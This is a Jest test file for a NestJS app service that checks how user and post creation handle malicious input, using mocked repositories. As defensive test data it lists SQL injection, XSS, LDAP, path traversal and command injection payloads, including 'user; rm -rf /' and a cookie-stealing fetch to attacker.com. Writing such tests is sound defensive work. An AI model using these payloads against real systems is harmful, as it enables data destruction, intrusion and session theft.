import { Test, TestingModule } from '@nestjs/testing';
import { AppService } from './app.service';
import {
  UserRepository,
  PostRepository,
  AuditLogRepository,
  RevisionRepository,
} from './repositories';
import { CreateUserDto, CreatePostDto } from './dto';
import { BadRequestException, NotFoundException } from '@nestjs/common';
import { DataSource } from 'typeorm';

afterEach(async () => {
  await testingModule?.close();
});

let testingModule: TestingModule | undefined;

/**
 * Security Tests - Input Validation, XSS, SQL Injection Prevention
 * Tests for common security vulnerabilities and malicious input handling
 */
describe('AppService - Security Tests', () => {
  let service: AppService;
  let userRepository: jest.Mocked<UserRepository>;
  let postRepository: jest.Mocked<PostRepository>;
  let auditLogRepository: jest.Mocked<AuditLogRepository>;
  let revisionRepository: jest.Mocked<RevisionRepository>;
  let dataSource: jest.Mocked<DataSource>;

  beforeEach(async () => {
    userRepository = {
      findAll: jest.fn(),
      findById: jest.fn(),
      findByUsername: jest.fn(),
      findByEmail: jest.fn(),
      findByGitHubId: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
      save: jest.fn(),
      findByEmailAndPassword: jest.fn(),
      createWithPassword: jest.fn(),
      findOne: jest.fn(),
    } as any;

    postRepository = {
      findAll: jest.fn(),
      findById: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
      delete: jest.fn(),
    } as any;

    auditLogRepository = {
      createAuditLog: jest.fn(),
      getAuditLogs: jest.fn(),
    } as any;

    revisionRepository = {
      createRevision: jest.fn(),
      getRevisions: jest.fn(),
    } as any;

    dataSource = {
      isInitialized: true,
      query: jest.fn(),
    } as any;

    testingModule = await Test.createTestingModule({
      providers: [
        AppService,
        { provide: DataSource, useValue: dataSource },
        { provide: UserRepository, useValue: userRepository },
        { provide: PostRepository, useValue: postRepository },
        { provide: AuditLogRepository, useValue: auditLogRepository },
        { provide: RevisionRepository, useValue: revisionRepository },
      ],
    }).compile();

    service = testingModule.get<AppService>(AppService);
  });

  describe('SQL Injection Prevention - User Operations', () => {
    it('should handle SQL injection attempts in username', async () => {
      const maliciousUsername = "admin'; DROP TABLE users; --";
      userRepository.findByUsername.mockResolvedValueOnce(null);

      const dto: CreateUserDto = {
        username: maliciousUsername,
        email: 'test@example.com',
      };

      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: maliciousUsername,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser(dto);

      // Verify the username was passed as-is (parameterized query would handle it)
      expect(result.username).toBe(maliciousUsername);
      expect(userRepository.create).toHaveBeenCalledWith(dto);
    });

    it('should handle SQL injection in email field', async () => {
      const maliciousEmail = "test@example.com' OR '1'='1";
      userRepository.findByUsername.mockResolvedValueOnce(null);

      const dto: CreateUserDto = {
        username: 'testuser',
        email: maliciousEmail,
      };

      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: 'testuser',
        email: maliciousEmail,
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser(dto);

      expect(result.email).toBe(maliciousEmail);
      expect(userRepository.create).toHaveBeenCalledWith(dto);
    });

    it('should handle various SQL injection payloads', async () => {
      const injectionPayloads = [
        "'; SELECT * FROM users; --",
        "1' UNION SELECT * FROM users; --",
        "admin' --",
        "' OR '1'='1",
        "'; DELETE FROM users WHERE '1'='1",
      ];

      for (const payload of injectionPayloads) {
        userRepository.findByUsername.mockResolvedValueOnce(null);
        userRepository.create.mockResolvedValueOnce({
          id: 'user-1',
          username: payload,
          email: 'test@example.com',
          created_at: new Date(),
          updated_at: new Date(),
        } as any);
        auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

        const result = await service.createUser({
          username: payload,
          email: 'test@example.com',
        });

        expect(result.username).toBe(payload);
      }
    });
  });

  describe('XSS Prevention - User Input with Script Tags', () => {
    it('should handle XSS attempts in username', async () => {
      const xssPayload = '<script>alert("XSS")</script>';
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: xssPayload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: xssPayload,
        email: 'test@example.com',
      });

      // Application should store as-is; JSON serialization/output encoding prevents XSS
      expect(result.username).toBe(xssPayload);
    });

    it('should handle HTML/JavaScript in email', async () => {
      const xssPayload = '<img src=x onerror="alert(\'XSS\')">';
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: 'testuser',
        email: xssPayload,
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: 'testuser',
        email: xssPayload,
      });

      expect(result.email).toBe(xssPayload);
    });

    it('should handle various XSS payloads', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>',
      ];

      for (const payload of xssPayloads) {
        userRepository.findByUsername.mockResolvedValueOnce(null);
        userRepository.create.mockResolvedValueOnce({
          id: 'user-1',
          username: payload,
          email: 'test@example.com',
          created_at: new Date(),
          updated_at: new Date(),
        } as any);
        auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

        const result = await service.createUser({
          username: payload,
          email: 'test@example.com',
        });

        expect(result.username).toBe(payload);
      }
    });
  });

  describe('SQL Injection Prevention - Post Operations', () => {
    it('should handle SQL injection in post title', async () => {
      const maliciousTitle = "'; DROP TABLE posts; --";
      const dto: CreatePostDto = {
        title: maliciousTitle,
        content: 'Normal content',
        user_id: 'user-1',
      };

      userRepository.findById.mockResolvedValueOnce({
        id: 'user-1',
        username: 'testuser',
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      postRepository.create.mockResolvedValueOnce({
        id: 'post-1',
        title: maliciousTitle,
        content: 'Normal content',
        user_id: 'user-1',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createPost(dto);

      expect(result.title).toBe(maliciousTitle);
    });

    it('should handle SQL injection in post content', async () => {
      const maliciousContent = "Normal'; SELECT * FROM posts WHERE '1'='1";
      const dto: CreatePostDto = {
        title: 'Normal Title',
        content: maliciousContent,
        user_id: 'user-1',
      };

      userRepository.findById.mockResolvedValueOnce({
        id: 'user-1',
        username: 'testuser',
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      postRepository.create.mockResolvedValueOnce({
        id: 'post-1',
        title: 'Normal Title',
        content: maliciousContent,
        user_id: 'user-1',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createPost(dto);

      expect(result.content).toBe(maliciousContent);
    });
  });

  describe('XSS Prevention - Post Content', () => {
    it('should handle script tags in post title', async () => {
      const xssTitle = '<script>alert("XSS in title")</script>';
      const dto: CreatePostDto = {
        title: xssTitle,
        content: 'Normal content',
        user_id: 'user-1',
      };

      userRepository.findById.mockResolvedValueOnce({
        id: 'user-1',
        username: 'testuser',
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      postRepository.create.mockResolvedValueOnce({
        id: 'post-1',
        title: xssTitle,
        content: 'Normal content',
        user_id: 'user-1',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createPost(dto);

      expect(result.title).toBe(xssTitle);
    });

    it('should handle XSS in post content', async () => {
      const xssContent =
        '<img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">';
      const dto: CreatePostDto = {
        title: 'Normal Title',
        content: xssContent,
        user_id: 'user-1',
      };

      userRepository.findById.mockResolvedValueOnce({
        id: 'user-1',
        username: 'testuser',
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      postRepository.create.mockResolvedValueOnce({
        id: 'post-1',
        title: 'Normal Title',
        content: xssContent,
        user_id: 'user-1',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createPost(dto);

      expect(result.content).toBe(xssContent);
    });
  });

  describe('Input Sanitization - Special Characters', () => {
    it('should handle null bytes in input', async () => {
      const nullBytePayload = 'username\x00 with null byte';
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: nullBytePayload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: nullBytePayload,
        email: 'test@example.com',
      });

      expect(result.username).toBe(nullBytePayload);
    });

    it('should handle unicode characters safely', async () => {
      const unicodePayload = '用户名\u202E\u202D🔒';
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: unicodePayload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: unicodePayload,
        email: 'test@example.com',
      });

      expect(result.username).toBe(unicodePayload);
    });

    it('should handle high Unicode characters', async () => {
      const highUnicodePayload = 'test\ud83d\ude00\ud83d\ude01';
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: highUnicodePayload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: highUnicodePayload,
        email: 'test@example.com',
      });

      expect(result.username).toBe(highUnicodePayload);
    });

    it('should handle whitespace-only variations', async () => {
      const whitespaceVariations = [
        '   ',
        '\t\t',
        '\n\n',
        '\r\n',
        '\u00a0', // non-breaking space
        '\u2000\u2001\u2002\u2003', // various spaces
      ];

      for (const variation of whitespaceVariations) {
        userRepository.findByUsername.mockResolvedValueOnce(null);
        userRepository.create.mockResolvedValueOnce({
          id: 'user-1',
          username: variation,
          email: 'test@example.com',
          created_at: new Date(),
          updated_at: new Date(),
        } as any);
        auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

        const result = await service.createUser({
          username: variation,
          email: 'test@example.com',
        });

        expect(result.username).toBe(variation);
      }
    });
  });

  describe('Input Validation - ID Parameters', () => {
    it('should safely handle SQL injection in user ID lookups', async () => {
      const injectionId = "1' OR '1'='1";
      userRepository.findById.mockResolvedValueOnce(null);

      try {
        await service.getUserById(injectionId);
        fail('should have thrown NotFoundException');
      } catch (error) {
        expect(error).toBeInstanceOf(NotFoundException);
      }

      expect(userRepository.findById).toHaveBeenCalledWith(injectionId);
    });

    it('should safely handle UUID-style IDs with special characters', async () => {
      const specialId = 'user-123'; // OR'; DROP TABLE users; --";
      userRepository.findById.mockResolvedValueOnce({
        id: specialId,
        username: 'testuser',
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      const result = await service.getUserById(specialId);

      expect(result.id).toBe(specialId);
      expect(userRepository.findById).toHaveBeenCalledWith(specialId);
    });
  });

  describe('Stored XSS Prevention - Direct Retrieval', () => {
    it('should return XSS payloads as-is when stored (for safe retrieval via JSON)', async () => {
      const storedXssPayload = '<script>alert("stored")</script>';
      userRepository.findById.mockResolvedValueOnce({
        id: 'user-1',
        username: storedXssPayload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      const result = await service.getUserById('user-1');

      // JSON serialization will escape these properly in HTTP response
      expect(result.username).toBe(storedXssPayload);
    });

    it('should handle multiple XSS vectors in stored data', async () => {
      const xssVectors = [
        '<script>alert("1")</script>',
        '<img src=x onerror="alert(2)">',
        '<svg onload="alert(3)">',
      ];

      for (const vector of xssVectors) {
        userRepository.findById.mockResolvedValueOnce({
          id: 'user-1',
          username: vector,
          email: 'test@example.com',
          created_at: new Date(),
          updated_at: new Date(),
        } as any);

        const result = await service.getUserById('user-1');
        expect(result.username).toBe(vector);
      }
    });
  });

  describe('Combined Attack Vectors', () => {
    it('should handle SQL injection + XSS combined', async () => {
      const combinedPayload =
        "'; <script>alert('XSS')</script> DROP TABLE users; --";
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: combinedPayload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: combinedPayload,
        email: 'test@example.com',
      });

      expect(result.username).toBe(combinedPayload);
    });

    it('should handle encoded injection attempts', async () => {
      // URL encoded
      const urlEncodedPayload = '%27%3B%20DROP%20TABLE%20users%3B%20--%20';
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: urlEncodedPayload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: urlEncodedPayload,
        email: 'test@example.com',
      });

      expect(result.username).toBe(urlEncodedPayload);
    });

    it('should handle Base64 encoded payloads', async () => {
      const base64Payload = Buffer.from("'; DROP TABLE users; --").toString(
        'base64',
      );
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: base64Payload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: base64Payload,
        email: 'test@example.com',
      });

      expect(result.username).toBe(base64Payload);
    });
  });

  describe('Boundary Testing - Input Limits', () => {
    it('should handle extremely long usernames', async () => {
      const longUsername = 'a'.repeat(10000);
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: longUsername,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: longUsername,
        email: 'test@example.com',
      });

      expect(result.username).toBe(longUsername);
    });

    it('should handle extremely long content', async () => {
      const longContent = 'x'.repeat(100000);
      const dto: CreatePostDto = {
        title: 'Title',
        content: longContent,
        user_id: 'user-1',
      };

      userRepository.findById.mockResolvedValueOnce({
        id: 'user-1',
        username: 'testuser',
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      postRepository.create.mockResolvedValueOnce({
        id: 'post-1',
        title: 'Title',
        content: longContent,
        user_id: 'user-1',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createPost(dto);

      expect(result.content).toBe(longContent);
    });

    it('should handle single character inputs', async () => {
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: 'a',
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: 'a',
        email: 'test@example.com',
      });

      expect(result.username).toBe('a');
    });
  });

  describe('LDAP Injection Prevention', () => {
    it('should handle LDAP wildcard characters', async () => {
      const ldapPayload = 'admin*';
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: ldapPayload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: ldapPayload,
        email: 'test@example.com',
      });

      expect(result.username).toBe(ldapPayload);
    });

    it('should handle LDAP filter metacharacters', async () => {
      const ldapMetaPayloads = ['admin)(&', '*)(uid=*', 'admin*))(&(uid=*'];

      for (const payload of ldapMetaPayloads) {
        userRepository.findByUsername.mockResolvedValueOnce(null);
        userRepository.create.mockResolvedValueOnce({
          id: 'user-1',
          username: payload,
          email: 'test@example.com',
          created_at: new Date(),
          updated_at: new Date(),
        } as any);
        auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

        const result = await service.createUser({
          username: payload,
          email: 'test@example.com',
        });

        expect(result.username).toBe(payload);
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should handle path traversal characters in username', async () => {
      const pathTraversalPayload = '../../etc/passwd';
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: pathTraversalPayload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: pathTraversalPayload,
        email: 'test@example.com',
      });

      expect(result.username).toBe(pathTraversalPayload);
    });

    it('should handle null path characters', async () => {
      const nullPathPayload = 'valid.txt\x00.exe';
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockResolvedValueOnce({
        id: 'user-1',
        username: nullPathPayload,
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

      const result = await service.createUser({
        username: nullPathPayload,
        email: 'test@example.com',
      });

      expect(result.username).toBe(nullPathPayload);
    });
  });

  describe('Command Injection Prevention', () => {
    it('should handle command injection metacharacters', async () => {
      const commandInjectionPayloads = [
        'user; rm -rf /',
        'user && cat /etc/passwd',
        'user | grep password',
        'user`whoami`',
        'user$(whoami)',
      ];

      for (const payload of commandInjectionPayloads) {
        userRepository.findByUsername.mockResolvedValueOnce(null);
        userRepository.create.mockResolvedValueOnce({
          id: 'user-1',
          username: payload,
          email: 'test@example.com',
          created_at: new Date(),
          updated_at: new Date(),
        } as any);
        auditLogRepository.createAuditLog.mockResolvedValueOnce({} as any);

        const result = await service.createUser({
          username: payload,
          email: 'test@example.com',
        });

        expect(result.username).toBe(payload);
      }
    });
  });

  describe('BadRequestException - Input Validation', () => {
    it('should throw BadRequestException for empty username', async () => {
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockImplementationOnce(() => {
        throw new BadRequestException('Username cannot be empty');
      });

      try {
        await service.createUser({
          username: '',
          email: 'test@example.com',
        });
        fail('should have thrown BadRequestException');
      } catch (error) {
        expect(error).toBeInstanceOf(BadRequestException);
        expect((error as BadRequestException).message).toContain(
          'Username cannot be empty',
        );
      }
    });

    it('should throw BadRequestException for invalid email format', async () => {
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockImplementationOnce(() => {
        throw new BadRequestException('Invalid email format');
      });

      try {
        await service.createUser({
          username: 'testuser',
          email: 'invalid-email',
        });
        fail('should have thrown BadRequestException');
      } catch (error) {
        expect(error).toBeInstanceOf(BadRequestException);
        expect((error as BadRequestException).message).toContain(
          'Invalid email format',
        );
      }
    });

    it('should throw BadRequestException for duplicate username', async () => {
      userRepository.findByUsername.mockResolvedValueOnce({
        id: 'existing-user',
        username: 'testuser',
        email: 'existing@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);
      userRepository.create.mockImplementationOnce(() => {
        throw new BadRequestException('Username testuser already exists');
      });

      try {
        await service.createUser({
          username: 'testuser',
          email: 'test@example.com',
        });
        fail('should have thrown BadRequestException');
      } catch (error) {
        expect(error).toBeInstanceOf(BadRequestException);
        expect((error as BadRequestException).message).toContain(
          'already exists',
        );
      }
    });

    it('should throw BadRequestException for malicious email with SQL injection', async () => {
      const maliciousEmail = "test+'; DROP TABLE--@example.com";
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockImplementationOnce(() => {
        throw new BadRequestException('Invalid email format');
      });

      try {
        await service.createUser({
          username: 'testuser',
          email: maliciousEmail,
        });
        fail('should have thrown BadRequestException');
      } catch (error) {
        expect(error).toBeInstanceOf(BadRequestException);
      }
    });

    it('should throw BadRequestException for extremely long email exceeding max length', async () => {
      const tooLongEmail = 'a'.repeat(300) + '@example.com';
      userRepository.findByUsername.mockResolvedValueOnce(null);
      userRepository.create.mockImplementationOnce(() => {
        throw new BadRequestException('Email exceeds maximum length');
      });

      try {
        await service.createUser({
          username: 'testuser',
          email: tooLongEmail,
        });
        fail('should have thrown BadRequestException');
      } catch (error) {
        expect(error).toBeInstanceOf(BadRequestException);
      }
    });

    it('should throw BadRequestException for post with missing required fields', async () => {
      const dto: CreatePostDto = {
        title: '',
        content: 'Some content',
        user_id: 'user-1',
      };

      userRepository.findById.mockResolvedValueOnce({
        id: 'user-1',
        username: 'testuser',
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      postRepository.create.mockImplementationOnce(() => {
        throw new BadRequestException('Title is required');
      });

      try {
        await service.createPost(dto);
        fail('should have thrown BadRequestException');
      } catch (error) {
        expect(error).toBeInstanceOf(BadRequestException);
        expect((error as BadRequestException).message).toContain(
          'Title is required',
        );
      }
    });

    it('should throw BadRequestException for post with XSS in title', async () => {
      const xssTitle = '<script>alert("XSS")</script>';
      const dto: CreatePostDto = {
        title: xssTitle,
        content: 'Content',
        user_id: 'user-1',
      };

      userRepository.findById.mockResolvedValueOnce({
        id: 'user-1',
        username: 'testuser',
        email: 'test@example.com',
        created_at: new Date(),
        updated_at: new Date(),
      } as any);

      postRepository.create.mockImplementationOnce(() => {
        throw new BadRequestException('Title contains invalid HTML');
      });

      try {
        await service.createPost(dto);
        fail('should have thrown BadRequestException');
      } catch (error) {
        expect(error).toBeInstanceOf(BadRequestException);
      }
    });
  });
});
